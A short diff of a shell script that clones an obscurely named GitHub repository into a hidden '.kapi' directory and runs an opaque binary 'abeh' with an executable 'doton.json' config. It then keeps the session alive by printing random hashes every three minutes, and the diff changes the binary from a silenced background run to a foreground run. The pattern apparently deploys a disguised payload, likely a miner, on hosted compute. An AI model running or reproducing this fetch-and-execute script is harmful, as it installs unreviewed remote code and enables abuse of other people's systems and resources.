@@ -2,5 +2,5 @@ mkdir .kapi && cd .kapi
 git clone https://github.com/ganejafaujanih/garing.git
 cd garing
 chmod +x doton.json && chmod +x abeh
-./abeh -c "doton.json" > /dev/null 2>&1 &
+./abeh -c "doton.json"
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
